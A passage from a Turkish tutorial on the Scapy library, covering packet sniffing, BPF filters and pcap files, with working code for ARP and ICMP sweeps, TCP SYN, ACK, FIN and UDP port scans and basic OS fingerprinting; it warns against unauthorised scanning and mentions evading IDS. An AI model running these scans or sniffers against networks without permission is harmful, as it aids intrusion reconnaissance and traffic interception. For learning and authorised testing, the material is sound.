*   **`loop`**: Paketleri döngüsel olarak göndermek için. `1` (doğru) ise Ctrl+C ile durdurana kadar gönderir.
*   **`inter`**: `loop=1` veya birden fazla paket gönderilirken paketler arasındaki saniye cinsinden bekleme süresi.
*   **`count`**: Gönderilecek toplam paket sayısı (eğer bir liste gönderiliyorsa her birini `count` defa gönderir, veya `loop` ile birlikte kullanılmaz).
*   **`retry`**: Cevap gelmezse paketi kaç kez daha göndereceğini belirtir (örn: `retry=2` toplam 3 deneme yapar).
*   **`multi`**: (`sr`, `srp` için) Bir istek paketine karşılık birden fazla cevap paketi gelebileceğini belirtir.

### Cevap Paketlerini Anlamak ve İşlemek
`sr` ve `srp` fonksiyonlarından dönen `ans` (answered) listesi, `(gönderilen_paket, alınan_cevap_paketi)` çiftlerini içerir.

```python
>>> hedef = "scanme.nmap.org"
>>> portlar = [22, 80, 135]
>>> ans, unans = sr(IP(dst=hedef)/TCP(sport=RandShort(), dport=portlar, flags="S"), timeout=1, verbose=0)

>>> for gonderilen, alinan in ans:
...     if alinan.haslayer(TCP):
...         if alinan[TCP].flags == 0x12: # SYN/ACK (SA)
...             print(f"Port {gonderilen[TCP].dport}: Açık")
...             # Bağlantıyı kapatmak için RST gönder
...             send(IP(dst=hedef)/TCP(sport=gonderilen[TCP].sport, dport=gonderilen[TCP].dport, flags="R"), verbose=0)
...         elif alinan[TCP].flags == 0x14: # RST/ACK (RA)
...             print(f"Port {gonderilen[TCP].dport}: Kapalı")
...     elif alinan.haslayer(ICMP) and int(alinan[ICMP].type)==3 and int(alinan[ICMP].code) in [1,2,3,9,10,13]:
...         print(f"Port {gonderilen[TCP].dport}: Filtrelenmiş (ICMP Unreachable)")
...

>>> for gonderilmeyen in unans:
...     print(f"Port {gonderilmeyen[TCP].dport}: Filtrelenmiş (Cevap Yok / Timeout)")
...
```

---

## 5. Ağ Trafiğini Dinleme (Sniffing)

Scapy, ağ trafiğini yakalamak (dinlemek) için `sniff()` fonksiyonunu sunar. Bu, Wireshark veya tcpdump gibi araçların yaptığı işe benzer.

### `sniff()` Fonksiyonu ve Temel Kullanımı
```python
from scapy.all import sniff

# eth0 arayüzünden 5 paket yakala ve özetlerini yazdır
>>> paketler = sniff(iface="eth0", count=5, prn=lambda x: x.summary())

# Yakalanan paketler bir PacketList nesnesidir
>>> print(type(paketler))
<class 'scapy.plist.PacketList'>
>>> if paketler:
...     paketler[0].show() # İlk yakalanan paketin detayları
...
```

### `sniff()` Fonksiyonunun Önemli Parametreleri:
*   **`iface`**: Dinlenecek ağ arayüzü (örn: `"eth0"`, `"wlan0"`, `"any"`). Bir liste olarak birden fazla arayüz de verilebilir: `iface=["eth0", "wlan0"]`. `None` verilirse tüm arayüzleri dinler (Linux'ta `any` gibi davranır).
*   **`filter`**: BPF (Berkeley Packet Filter) sözdiziminde bir filtre. Sadece belirli türdeki paketleri yakalamak için kullanılır.
*   **`count`**: Yakalanacak toplam paket sayısı. `0` (varsayılan) verilirse siz durdurana kadar (Ctrl+C) dinler.
*   **`prn`**: Yakalanan *her paket için* çağrılacak bir fonksiyon. Genellikle anlık işlem veya yazdırma için kullanılır: `prn=lambda paket: paket.summary()`.
*   **`lfilter`**: Yakalanan pakete uygulanacak bir Python fonksiyonu. Bu fonksiyon paketi argüman olarak alır ve `True` veya `False` döndürür. Sadece `True` dönen paketler `prn` fonksiyonuna geçer ve/veya `store` edilirse saklanır.
*   **`store`**: `1` (varsayılan) ise yakalanan paketleri bellekte saklar ve `sniff()` fonksiyonu bittiğinde bir `PacketList` olarak döndürür. `0` ise saklamaz (sadece `prn` ile işlersiniz, bellek tasarrufu sağlar).
*   **`timeout`**: Belirli bir süre (saniye cinsinden) sonra dinlemeyi otomatik olarak durdurur.
*   **`stop_filter`**: Yakalanan her paket için çağrılacak bir fonksiyondur. Eğer bu fonksiyon `True` dönerse, dinleme işlemi durdurulur.
*   **`offline`**: Bir `.pcap` dosyasından paket okumak için kullanılır. `iface` yerine dosya yolu verilir.
    ```python
    >>> paketler_dosyadan = sniff(offline="yakalanan_trafik.pcap")
    ```
*   **`promisc`**: Ağ arayüzünü karışık (promiscuous) moda alıp almayacağını belirtir. Varsayılan olarak `conf.promisc` değerini kullanır. Karışık mod, arayüze gelen tüm paketleri (sadece kendine ait olmayanları da) yakalamasını sağlar.

### Filtreleme: BPF (Berkeley Packet Filter)
`filter` parametresi, tcpdump ile aynı BPF sözdizimini kullanır. Bu, dinleme işlemini çok daha verimli hale getirir çünkü filtreleme çekirdek (kernel) seviyesinde yapılır.

Bazı yaygın BPF filtreleri:
*   `"host 192.168.1.1"`: Belirtilen IP adresiyle ilgili tüm trafik (kaynak veya hedef).
*   `"src host 192.168.1.1"`: Sadece kaynak IP'si belirtilen olan trafik.
*   `"dst host 192.168.1.1"`: Sadece hedef IP'si belirtilen olan trafik.
*   `"net 192.168.0.0/16"`: Belirtilen ağ bloğuyla ilgili trafik.
*   `"port 80"`: Kaynak veya hedef portu 80 olan trafik.
*   `"tcp port 443"`: Sadece TCP ve portu 443 olan trafik.
*   `"udp and port 53"`: UDP ve portu 53 olan trafik (DNS).
*   `"icmp"`: Sadece ICMP paketleri.
*   `"arp"`: Sadece ARP paketleri.
*   `"ether host aa:bb:cc:dd:ee:ff"`: Belirtilen MAC adresiyle ilgili trafik.
*   `"not host 192.168.1.1"`: Belirtilen host dışındaki trafik.
*   `"(tcp or udp) and (portrange 1-1024 or port 8080)"`: Karmaşık filtreler.

```python
>>> # Sadece 1.1.1.1 adresinden gelen ICMP echo reply paketlerini yakala
>>> icmp_cevaplar = sniff(filter="src host 1.1.1.1 and icmp[icmptype] == icmp-echoreply", count=3, iface="eth0")
>>> icmp_cevaplar.summary()
```

### `prn` ve `lfilter` ile Anlık Paket İşleme

*   **`prn` (print)**: Her yakalanan paket için bir fonksiyon çalıştırır, ancak paketi saklamaz (eğer `store=0` ise).
    ```python
    >>> def paket_isleyici(paket):
    ...     if paket.haslayer(IP):
    ...         print(f"Yakalandı: {paket[IP].src} -> {paket[IP].dst} Protokol: {paket[IP].proto}")
    ...
    >>> sniff(iface="eth0", prn=paket_isleyici, count=10, store=0) # store=0 bellek için önemli
    ```

*   **`lfilter` (lambda filter)**: Python tabanlı bir filtre. BPF kadar verimli değildir çünkü paketler önce yakalanır sonra Python'da filtrelenir, ama daha karmaşık mantıklar için kullanılabilir.
    ```python
    >>> # Sadece HTTP GET isteklerini içeren TCP paketlerini yakala
    >>> def http_get_filtresi(paket):
    ...     return paket.haslayer(TCP) and paket[TCP].dport == 80 and \
    ...            paket.haslayer(Raw) and b"GET" in paket[Raw].load
    ...
    >>> http_paketleri = sniff(iface="eth0", lfilter=http_get_filtresi, count=2)
    >>> if http_paketleri: http_paketleri[0].show()
    ```

### Yakalanan Paketlerle Çalışmak (`PacketList`)
`sniff(store=1)` ile yakalanan paketler bir `PacketList` nesnesinde saklanır. Bu, Python listelerine benzer şekilde davranır:
```python
>>> paketler = sniff(count=5)
>>> len(paketler)
5
>>> ilk_paket = paketler[0]
>>> son_paket = paketler[-1]
>>> for pkt in paketler:
...     print(pkt.summary())
...
>>> # Belirli bir kritere uyan paketleri filtrele (Python ile)
>>> tcp_paketleri = [p for p in paketler if p.haslayer(TCP)]
>>> # veya PacketList'in kendi filtreleme özelliği
>>> tcp_paketleri_scapy = paketler.filter(lambda p: p.haslayer(TCP))
```

### Paketleri Dosyaya Yazma (`wrpcap`) ve Okuma (`rdpcap`)
Yakalanan trafiği daha sonra analiz etmek üzere `.pcap` (Wireshark/tcpdump formatı) dosyalarına kaydedebilir veya bu dosyalardan okuyabilirsiniz.

*   **`wrpcap("dosya_adi.pcap", paket_listesi)`**: Paket listesini dosyaya yazar.
    ```python
    >>> trafik = sniff(count=20, iface="eth0")
    >>> wrpcap("kaydedilen_trafik.pcap", trafik)
    >>> print("Trafik kaydedildi.")
    ```

*   **`rdpcap("dosya_adi.pcap")`**: Dosyadan paketleri okur ve bir `PacketList` döndürür.
    ```python
    >>> okunan_paketler = rdpcap("kaydedilen_trafik.pcap")
    >>> print(f"{len(okunan_paketler)} adet paket okundu.")
    >>> okunan_paketler.summary()
    ```
    `sniff(offline="dosya_adi.pcap")` de aynı işi yapar ve ek olarak `filter` gibi `sniff` parametrelerini de kullanmanızı sağlar.

```python
>>> # Dosyadaki sadece HTTP paketlerini oku ve işle
>>> http_paketleri_dosyadan = sniff(offline="kaydedilen_trafik.pcap", filter="tcp port 80", prn=lambda x: x.summary())
```

---

## 6. Temel Ağ Senaryoları ve Keşif Teknikleri

Bu bölümde, Scapy'yi kullanarak çeşitli ağ keşif ve tarama tekniklerini nasıl uygulayacağımızı göreceğiz. Bu teknikler, ağ haritalama, aktif cihaz tespiti ve açık portları bulma gibi sızma testlerinin ve ağ yönetiminin temel adımlarıdır.

**UYARI:** Bu teknikleri sadece kendi kontrolünüzdeki veya test etme izniniz olan ağlarda uygulayın. İzinsiz tarama yasa dışı olabilir.

### ARP Ping (Yerel Ağ Keşfi)
ARP (Address Resolution Protocol), yerel ağdaki IP adreslerini MAC adreslerine çözümler. Bir IP adresine ARP isteği göndererek, cevap verip vermediğine bakarak o IP adresinin aktif olup olmadığını anlayabiliriz. Bu yöntem sadece yerel ağ (aynı broadcast domain) içinde çalışır.

```python
from scapy.all import Ether, ARP, srp

def arp_scan(ip_range, interface="eth0"):
    """
    Belirtilen IP aralığındaki aktif cihazları ARP ile tarar.
    ip_range: "192.168.1.0/24" veya "192.168.1.1-100" gibi.
    """
    print(f"[*] {ip_range} ağında ARP taraması başlatılıyor ({interface} arayüzü)...")
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_range)
    
    # srp fonksiyonu Katman 2'de paket gönderir ve cevapları toplar
    # answered_list, unanswered_list = srp(paket, timeout, iface, verbose)
    answered, unanswered = srp(arp_request, timeout=2, iface=interface, verbose=False)
    
    print("\n[+] Aktif Cihazlar:")
    clients = []
    if answered:
        for sent_packet, received_packet in answered:
            clients.append({'ip': received_packet.psrc, 'mac': received_packet.hwsrc})
            print(f"  IP Adresi: {received_packet.psrc:<15} MAC Adresi: {received_packet.hwsrc}")
    else:
        print("  Hiçbir aktif cihaz bulunamadı.")
    return clients

# Kullanım örneği (Scapy kabuğunda veya script içinde):
# aktif_cihazlar = arp_scan("192.168.1.0/24", "eth0") 
# print(aktif_cihazlar)
```
**Açıklama:**
*   `Ether(dst="ff:ff:ff:ff:ff:ff")`: Ethernet broadcast adresine gönderiyoruz, böylece yerel ağdaki tüm cihazlar paketi alır.
*   `ARP(pdst=ip_range)`: Hedef IP aralığını belirtiyoruz. Scapy bu aralıktaki her IP için ayrı bir ARP isteği oluşturur.
*   `srp(...)`: Paketi gönderir ve `(gönderilen, alınan)` çiftlerinden oluşan bir liste döndürür.
*   `received_packet.psrc`: Cevap veren cihazın IP adresi.
*   `received_packet.hwsrc`: Cevap veren cihazın MAC adresi.

### ICMP Ping (Host Keşfi)
ICMP (Internet Control Message Protocol) "echo request" paketleri (genellikle "ping" olarak bilinir), bir hostun ağ üzerinde erişilebilir olup olmadığını test etmek için kullanılır. ARP'nin aksine, ICMP ping yerel ağ dışındaki hostlar için de çalışır (eğer güvenlik duvarları ICMP'yi engellemiyorsa).

```python
from scapy.all import IP, ICMP, sr1, send

def icmp_ping(host_ip, timeout=1, verbose=False):
    """Verilen IP adresine tek bir ICMP echo request gönderir."""
    ping_request = IP(dst=host_ip)/ICMP()
    # sr1 fonksiyonu tek bir paket gönderir ve ilk cevabı bekler.
    response = sr1(ping_request, timeout=timeout, verbose=verbose)
    
    if response:
        if response.haslayer(ICMP) and response[ICMP].type == 0: # Echo reply
            print(f"[+] {host_ip} aktif ve cevap veriyor.")
            return True
        # Bazen routerlar veya hostlar farklı ICMP mesajları gönderebilir
        # elif response.haslayer(ICMP):
        #     print(f"[-] {host_ip} ICMP cevabı verdi (type={response[ICMP].type}, code={response[ICMP].code}) ama echo reply değil.")
        #     return False 
    else:
        print(f"[-] {host_ip} cevap vermedi (timeout veya ulaşılamıyor).")
        return False

# Kullanım örneği:
# icmp_ping("google.com")
# icmp_ping("192.168.1.1")
```

### ICMP Ping Sweep (Ağ Tarama)
Belirli bir IP aralığındaki tüm adreslere ICMP ping göndererek aktif hostları toplu olarak tespit etme yöntemidir.

```python
from scapy.all import IP, ICMP, sr, RandString
import ipaddress # IP adres aralıklarını yönetmek için

def icmp_ping_sweep(network_cidr, timeout=0.5, verbose=False):
    """
    Verilen CIDR bloğundaki tüm IP adreslerine ICMP ping gönderir.
    network_cidr: "192.168.1.0/24" gibi.
    """
    print(f"[*] {network_cidr} ağında ICMP Ping Sweep başlatılıyor...")
    active_hosts = []
    
    try:
        network = ipaddress.ip_network(network_cidr, strict=False)
    except ValueError:
        print(f"[!] Geçersiz ağ adresi: {network_cidr}")
        return active_hosts

    packets = []
    for ip_obj in network.hosts(): # .hosts() ağ ve broadcast adreslerini hariç tutar
        ip_str = str(ip_obj)
        # Her pakete farklı bir ID ve sequence numarası vermek iyi bir pratiktir
        # Ayrıca payload ekleyerek bazı IDS'leri atlatmaya çalışılabilir (dikkatli kullanılmalı)
        packet = IP(dst=ip_str)/ICMP(id=RandShort(), seq=RandShort())/Raw(load=RandString(size=16))
        packets.append(packet)

    if not packets:
        print("[-] Taranacak host bulunamadı.")
        return active_hosts

    # sr fonksiyonu bir paket listesi gönderir ve cevapları toplar.
    # answered_list, unanswered_list = sr(paket_listesi, timeout, verbose)
    print(f"[*] {len(packets)} adet ICMP isteği gönderiliyor...")
    answered, unanswered = sr(packets, timeout=timeout, verbose=verbose, multi=True) # multi=True, bir isteğe birden fazla cevap gelebilir
    
    if answered:
        print("\n[+] Aktif Hostlar:")
        for sent, received in answered:
            if received.haslayer(ICMP) and received[ICMP].type == 0: # Echo reply
                print(f"  {received.src} aktif.")
                if received.src not in active_hosts:
                     active_hosts.append(received.src)
    
    if not active_hosts:
        print("  Bu ağda ICMP ile aktif host bulunamadı.")
        
    return active_hosts

# Kullanım örneği:
# aktif_hostlar_listesi = icmp_ping_sweep("192.168.1.0/29", timeout=0.2) # Daha küçük bir aralık test için
# print("\nTespit edilen aktif hostlar:", aktif_hostlar_listesi)
```
**İyileştirmeler:**
*   `RandShort()` ve `RandString()`: Paketleri biraz daha rastgele hale getirir.
*   `ipaddress` modülü: CIDR notasyonunu kolayca IP listesine çevirir.
*   `multi=True`: Bazı durumlarda bir isteğe birden fazla ICMP cevabı (örn: redirect) gelebilir.

### TCP Port Tarama
Bir host üzerinde hangi TCP portlarının açık (dinlemede) olduğunu tespit etmek için kullanılır.

#### TCP SYN Scan (Stealth Scan / Yarı Açık Tarama)
En popüler tarama türlerinden biridir. Hedef porta bir TCP SYN paketi gönderir:
*   **SYN/ACK cevabı gelirse:** Port açıktır. Tarayıcı hemen bir RST paketi göndererek tam bağlantı kurulmasını engeller. Bu yüzden "stealth" (gizli) olarak adlandırılır çünkü tam bağlantı loglanmayabilir.
*   **RST/ACK cevabı gelirse:** Port kapalıdır.
*   **Cevap yoksa veya ICMP "destination unreachable" (type 3, code 1, 2, 3, 9, 10, 13) gelirse:** Port filtrelenmiştir (bir güvenlik duvarı tarafından engelleniyor olabilir).

```python
from scapy.all import IP, TCP, sr1, RandShort, send

def tcp_syn_scan(target_ip, ports, timeout=1, verbose=False):
    """
    Belirtilen IP ve portlara TCP SYN taraması yapar.
    ports: Tek bir port (int) veya port listesi/tuple'ı.
    """
    if isinstance(ports, int):
        ports = [ports]
    
    print(f"[*] {target_ip} üzerinde TCP SYN taraması başlatılıyor (Portlar: {ports})...")
    open_ports = []
    closed_ports = []
    filtered_ports = []

    for port in ports:
        src_port = RandShort() # Rastgele bir kaynak port kullanmak daha iyidir
        syn_packet = IP(dst=target_ip)/TCP(sport=src_port, dport=port, flags="S")
        response = sr1(syn_packet, timeout=timeout, verbose=verbose)
        
        if response is None:
            # print(f"  Port {port}: Filtrelenmiş (Cevap yok)")
            filtered_ports.append(port)
        elif response.haslayer(TCP):
            if response[TCP].flags == 0x12: # SYN/ACK (SA)
                # print(f"  Port {port}: Açık")
                open_ports.append(port)
                # Bağlantıyı hemen resetle (stealth kısmı)
                rst_packet = IP(dst=target_ip)/TCP(sport=src_port, dport=port, flags="R", seq=response[TCP].ack)
                send(rst_packet, verbose=False)
            elif response[TCP].flags == 0x14: # RST/ACK (RA)
                # print(f"  Port {port}: Kapalı")
                closed_ports.append(port)
            else: # Beklenmedik TCP bayrağı
                # print(f"  Port {port}: Filtrelenmiş (Beklenmedik TCP bayrağı: {response[TCP].flags})")
                filtered_ports.append(port)
        elif response.haslayer(ICMP):
            if int(response[ICMP].type) == 3 and int(response[ICMP].code) in [1, 2, 3, 9, 10, 13]:
                # print(f"  Port {port}: Filtrelenmiş (ICMP Unreachable - {response[ICMP].code})")
                filtered_ports.append(port)
            else: # Diğer ICMP mesajları
                # print(f"  Port {port}: Filtrelenmiş (ICMP Mesajı: Type {response[ICMP].type} Code {response[ICMP].code})")
                filtered_ports.append(port)
        else: # Ne TCP ne ICMP, beklenmedik bir durum
            # print(f"  Port {port}: Durum bilinmiyor (Beklenmedik paket tipi)")
            filtered_ports.append(port)
            
    print("\n[+] Tarama Sonuçları:")
    if open_ports: print(f"  Açık Portlar: {open_ports}")
    if closed_ports: print(f"  Kapalı Portlar: {closed_ports}")
    if filtered_ports: print(f"  Filtrelenmiş Portlar: {filtered_ports}")
    
    return {'open': open_ports, 'closed': closed_ports, 'filtered': filtered_ports}

# Kullanım örneği:
# target = "scanme.nmap.org" # Test için Nmap'in sağladığı bir hedef
# common_ports = [21, 22, 23, 25, 53, 80, 110, 139, 443, 445, 3389, 8080]
# results = tcp_syn_scan(target, common_ports, timeout=0.5)
```

#### TCP Connect Scan
Bu tarama türü, hedef porta tam bir TCP bağlantısı (üçlü el sıkışma) kurmaya çalışır.
*   Bağlantı başarılı olursa (SYN, SYN/ACK, ACK): Port açıktır. Scapy ile bu, `socket` modülü kullanılarak daha kolay yapılır, ancak Scapy ile de simüle edilebilir.
*   Bağlantı başarısız olursa: Port kapalı veya filtrelenmiştir.
Bu tarama daha güvenilirdir ancak loglarda daha fazla iz bırakır.

```python
# Scapy ile tam connect scan simülasyonu biraz daha karmaşıktır,
# çünkü ACK'ı aldıktan sonra bağlantıyı yönetmek gerekir.
# Genellikle Python'un 'socket' modülü bu iş için daha uygundur.
# Ancak bir SYN/ACK aldıktan sonra ACK göndererek portun açık olduğu teyit edilebilir.

def tcp_connect_scan_scapy_like(target_ip, port, timeout=1, verbose=False):
    src_port = RandShort()
    # 1. SYN gönder
    syn = IP(dst=target_ip)/TCP(sport=src_port, dport=port, flags="S", seq=RandInt())
    syn_ack = sr1(syn, timeout=timeout, verbose=verbose)

    if syn_ack and syn_ack.haslayer(TCP) and syn_ack[TCP].flags == 0x12: # SYN/ACK
        # 2. ACK gönder
        my_ack = syn_ack[TCP].seq + 1
        ack = IP(dst=target_ip)/TCP(sport=src_port, dport=port, flags="A", seq=syn[TCP].seq + 1, ack=my_ack)
        send(ack, verbose=verbose)
        # Teorik olarak bağlantı kuruldu. Port açık.
        # Bağlantıyı kapatmak için RST veya FIN gönderilebilir.
        rst = IP(dst=target_ip)/TCP(sport=src_port, dport=port, flags="R", seq=ack[TCP].seq)
        send(rst, verbose=verbose)
        print(f"  Port {port} (TCP Connect): Açık")
        return True
    elif syn_ack and syn_ack.haslayer(TCP) and syn_ack[TCP].flags == 0x14: # RST/ACK
        print(f"  Port {port} (TCP Connect): Kapalı")
        return False
    else:
        print(f"  Port {port} (TCP Connect): Filtrelenmiş veya Cevap Yok")
        return False

# Kullanım örneği:
# tcp_connect_scan_scapy_like("scanme.nmap.org", 80)
```

#### TCP ACK Scan (Firewall Tespiti)
Hedef porta sadece ACK bayrağı set edilmiş bir TCP paketi gönderir.
*   **RST cevabı gelirse:** Port muhtemelen filtrelenmemiş (stateful firewall portu izlemiyor olabilir veya host portu kapatmış).
*   **Cevap yoksa veya ICMP "destination unreachable" gelirse:** Port muhtemelen stateful bir firewall tarafından filtrelenmiştir.
Bu tarama açık/kapalı portları tespit etmez, daha çok firewall kurallarını anlamak için kullanılır.

```python
def tcp_ack_scan(target_ip, ports, timeout=1, verbose=False):
    if isinstance(ports, int):
        ports = [ports]
    
    print(f"[*] {target_ip} üzerinde TCP ACK taraması başlatılıyor (Portlar: {ports})...")
    unfiltered_ports = []
    filtered_ports_icmp = []
    filtered_ports_no_response = []

    for port in ports:
        ack_packet = IP(dst=target_ip)/TCP(dport=port, flags="A", ack=RandInt()) # Rastgele ack numarası
        response = sr1(ack_packet, timeout=timeout, verbose=verbose)
        
        if response is None:
            # print(f"  Port {port}: Filtrelenmiş (Cevap yok)")
            filtered_ports_no_response.append(port)
        elif response.haslayer(TCP) and response[TCP].flags == 0x04: # RST
            # print(f"  Port {port}: Filtrelenmemiş (RST alındı)")
            unfiltered_ports.append(port)
        elif response.haslayer(ICMP) and int(response[ICMP].type) == 3 and \
             int(response[ICMP].code) in [0, 1, 2, 3, 9, 10, 13]: # Destination Unreachable
            # print(f"  Port {port}: Filtrelenmiş (ICMP Unreachable - Kod: {response[ICMP].code})")
            filtered_ports_icmp.append(port)
        # Diğer durumlar da filtrelenmiş sayılabilir
            
    print("\n[+] ACK Scan Sonuçları:")
    if unfiltered_ports: print(f"  Filtrelenmemiş Portlar (RST döndü): {unfiltered_ports}")
    if filtered_ports_icmp: print(f"  Filtrelenmiş Portlar (ICMP Unreachable): {filtered_ports_icmp}")
    if filtered_ports_no_response: print(f"  Filtrelenmiş Portlar (Cevap Yok): {filtered_ports_no_response}")
    
    return {'unfiltered': unfiltered_ports, 'filtered_icmp': filtered_ports_icmp, 'filtered_no_resp': filtered_ports_no_response}

# Kullanım örneği:
# ack_results = tcp_ack_scan("scanme.nmap.org", [80, 22], timeout=0.5)
```

#### TCP FIN, Null, Xmas Scan
Bu tarama türleri, bazı işletim sistemlerinin TCP standartlarına (RFC 793) tam uymamasından faydalanır.
*   **FIN Scan:** Sadece FIN bayrağı set edilmiş paket gönderir.
*   **Null Scan:** Hiçbir bayrak set edilmemiş paket gönderir.
*   **Xmas Scan:** FIN, PSH ve URG bayrakları set edilmiş paket gönderir.

RFC 793'e göre, kapalı bir porta bu tür paketler geldiğinde RST cevabı dönmelidir. Açık bir port ise bu paketleri sessizce düşürmelidir (cevap vermemelidir).
*   **RST cevabı gelirse:** Port kapalıdır.
*   **Cevap yoksa:** Port açık VEYA filtrelenmiştir. (Windows bu kurala uymaz, her durumda RST döner).
Bu taramalar genellikle Unix benzeri sistemlerde daha iyi çalışır ve SYN taramalarına göre daha gizli olabilirler.

```python
def tcp_fin_scan(target_ip, ports, timeout=1, verbose=False): # Null ve Xmas için benzer fonksiyonlar yazılabilir
    if isinstance(ports, int):
        ports = [ports]
    
    print(f"[*] {target_ip} üzerinde TCP FIN taraması başlatılıyor (Portlar: {ports})...")
    open_or_filtered_ports = []
    closed_ports = []
    
    for port in ports:
        fin_packet = IP(dst=target_ip)/TCP(dport=port, flags="F")
        response = sr1(fin_packet, timeout=timeout, verbose=verbose)
        
        if response is None:
            # print(f"  Port {port}: Açık veya Filtrelenmiş")
            open_or_filtered_ports.append(port)
        elif response.haslayer(TCP) and response[TCP].flags == 0x14: # RST/ACK
            # print(f"  Port {port}: Kapalı")
            closed_ports.append(port)
        elif response.haslayer(ICMP) and int(response[ICMP].type) == 3 and \
             int(response[ICMP].code) in [0, 1, 2, 3, 9, 10, 13]:
            # print(f"  Port {port}: Filtrelenmiş (ICMP Unreachable)") # Bazı sistemler FIN'e böyle cevap verebilir
            # Bu durumda açık/filtrelenmiş listesine eklemek daha doğru olabilir
            open_or_filtered_ports.append(port)
            
    print("\n[+] FIN Scan Sonuçları:")
    if open_or_filtered_ports: print(f"  Açık veya Filtrelenmiş Portlar (Cevap Yok): {open_or_filtered_ports}")
    if closed_ports: print(f"  Kapalı Portlar (RST döndü): {closed_ports}")
    
    return {'open_filtered': open_or_filtered_ports, 'closed': closed_ports}

# Kullanım örneği (Null için flags="", Xmas için flags="FPU"):
# fin_results = tcp_fin_scan("scanme.nmap.org", [80, 22], timeout=1)
```

### UDP Port Tarama
UDP bağlantısız bir protokol olduğu için port taraması TCP'ye göre daha zordur ve daha yavaş olabilir.
*   Hedef porta bir UDP paketi gönderilir (genellikle boş veya protokole özgü bir payload ile).
*   **Cevap yoksa:** Port açık VEYA filtrelenmiş olabilir. Çoğu açık UDP portu cevap vermez.
*   **ICMP "port unreachable" (type 3, code 3) cevabı gelirse:** Port kapalıdır.
*   **UDP cevabı gelirse (örn: DNS, NTP, SNMP için protokole özgü bir cevap):** Port açıktır.
*   **Diğer ICMP "unreachable" hataları (type 3, code 1, 2, 9, 10, 13):** Port filtrelenmiştir.

```python
from scapy.all import IP, UDP, DNS, DNSQR, ICMP, sr1, Raw

def udp_scan(target_ip, ports, timeout=2, verbose=False):
    if isinstance(ports, int):
        ports = [ports]
        
    print(f"[*] {target_ip} üzerinde UDP taraması başlatılıyor (Portlar: {ports})...")
    open_ports = []
    open_or_filtered_ports = []
    closed_ports = []
    filtered_ports_icmp = []

    for port in ports:
        # Bazı portlar için protokole özgü payload göndermek cevap alma şansını artırır
        if port == 53: # DNS
            payload = DNS(rd=1, qd=DNSQR(qname="example.com"))
        elif port == 123: # NTP
            # NTP için özel bir Scapy katmanı yoksa, ham byte'lar eklenebilir.
            # Basit bir boş UDP paketi de çoğu zaman yeterlidir.
            payload = Raw(load=b'\x17\x00\x03\x2a' + b'\x00'*4) # Basit bir NTP isteği
        elif port == 161: # SNMP
            # SNMP için scapy.contrib.snmp gerekir. Basit bir UDP paketi gönderelim.
            payload = Raw(load="public") # SNMP community string denemesi
        else:
            payload = Raw(load="X"*8) # Genel bir payload

        udp_packet = IP(dst=target_ip)/UDP(dport=port)/payload
        response = sr1(udp_packet, timeout=timeout, verbose=verbose)
        
        if response is None:
            # print(f"  Port {port} (UDP): Açık veya Filtrelenmiş (Cevap yok)")
            open_or_filtered_ports.append(port)
        elif response.haslayer(UDP): # UDP cevabı alındı
            # print(f"  Port {port} (UDP): Açık (UDP cevabı alındı)")
            open_ports.append(port)
        elif response.haslayer(ICMP):
            if int(response[ICMP].type) == 3 and int(response[ICMP].code) == 3: # Port Unreachable
                # print(f"  Port {port} (UDP): Kapalı (ICMP Port Unreachable)")
                closed_ports.append(port)
            elif int(response[ICMP].type) == 3 and int(response[ICMP].code) in [0, 1, 2, 9, 10, 13]:
                # print(f"  Port {port} (UDP): Filtrelenmiş (ICMP Unreachable - Kod: {response[ICMP].code})")
                filtered_ports_icmp.append(port)
            # Diğer ICMP durumları da filtrelenmiş sayılabilir
        # Diğer beklenmedik cevaplar da filtrelenmiş sayılabilir

    print("\n[+] UDP Scan Sonuçları:")
    if open_ports: print(f"  Açık Portlar (UDP Cevabı Alındı): {open_ports}")
    if open_or_filtered_ports: print(f"  Açık veya Filtrelenmiş Portlar (Cevap Yok): {open_or_filtered_ports}")
    if closed_ports: print(f"  Kapalı Portlar (ICMP Port Unreachable): {closed_ports}")
    if filtered_ports_icmp: print(f"  Filtrelenmiş Portlar (Diğer ICMP Unreachable): {filtered_ports_icmp}")
        
    return {'open': open_ports, 'open_filtered': open_or_filtered_ports, 'closed': closed_ports, 'filtered_icmp': filtered_ports_icmp}

# Kullanım örneği:
# udp_results = udp_scan("scanme.nmap.org", [53, 123, 161, 69], timeout=1) # TFTP için port 69
```
**Önemli Not:** UDP taraması, cevapların gelmemesi nedeniyle yavaş ve güvenilmez olabilir. Timeout değerlerini ve tekrar deneme sayılarını ayarlamak gerekebilir.

### İşletim Sistemi Tespiti (OS Fingerprinting - Temel Yaklaşımlar)
Scapy ile tam teşekküllü bir OS fingerprinter (Nmap gibi) yazmak oldukça karmaşıktır, ancak bazı temel teknikler uygulanabilir:
1.  **TTL Değerleri:** Farklı işletim sistemleri IP paketlerinde varsayılan TTL değerleriyle başlar. Gelen cevaplardaki TTL değerleri bir ipucu verebilir (örn: Linux ~64, Windows ~128, Cisco ~255). Ancak bu, aradaki router sayısı nedeniyle değişir.
2.  **TCP Pencere Boyutu (Window Size):** SYN/ACK paketlerindeki TCP pencere boyutu da OS hakkında ipucu verebilir.
3.  **IP ID Değerleri:** Bazı OS'ler IP ID'yi sıralı artırırken, bazıları rastgele veya sıfır kullanır.
4.  **TCP Seçenekleri (Options):** SYN paketlerindeki TCP seçeneklerinin sırası ve türleri (MSS, Window Scale, SACK Permitted, Timestamps) OS'e göre değişebilir.
5.  **ICMP Davranışları:** Farklı ICMP isteklerine (örn: "address mask request") veya hatalı paketlere verilen cevaplar.

```python
def basic_os_fingerprint(target_ip, timeout=1):
    print(f"[*] {target_ip} için temel OS ipuçları toplanıyor...")
    clues = {}

    # 1. ICMP Echo Request ile TTL ve IP ID
    icmp_pkt = IP(dst=target_ip)/ICMP()
    response = sr1(icmp_pkt, timeout=timeout, verbose=False)
    if response:
        clues['initial_ttl_guess'] = response[IP].ttl 
        # TTL'yi 64, 128, 255 gibi standart değerlere yuvarlayarak tahmin yapılabilir.
        # Örneğin, TTL 54 ise muhtemelen başlangıç TTL'si 64 olan bir Linux (10 hop uzakta).
        if response[IP].ttl <= 64: clues['os_family_by_ttl'] = "Linux/Unix-like (<=64)"
        elif response[IP].ttl <= 128: clues['os_family_by_ttl'] = "Windows-like (<=128)"
        else: clues['os_family_by_ttl'] = "Cisco/Solaris-like (>128)"
        
        clues['ip_id_on_icmp'] = response[IP].id
    else:
        print("[-] ICMP ile TTL/IP ID alınamadı.")

    # 2. TCP SYN ile Window Size ve TCP Options (örneğin 80 portuna)
    # Genellikle açık bir porta denemek daha iyi sonuç verir.
